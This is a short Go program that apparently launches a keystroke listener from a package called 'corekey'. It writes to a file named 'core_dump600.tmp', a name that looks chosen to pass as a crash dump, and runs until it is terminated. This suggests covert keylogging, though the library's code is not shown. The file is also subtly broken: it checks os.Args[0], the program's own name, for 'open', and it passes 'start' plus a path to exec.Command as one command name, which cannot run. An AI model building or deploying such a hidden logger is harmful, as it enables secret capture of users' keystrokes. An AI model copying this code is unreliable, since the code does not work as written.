package main

import (
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/dxasu/corekey"
)

func main() {
	if len(os.Args) > 0 && os.Args[0] == "open" {
		path := corekey.GetAppDataPath()
		exec.Command("start " + path).Run()
		return
	}

	corekey.PcListen("core_dump600.tmp", 0)
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	<-sigs
}
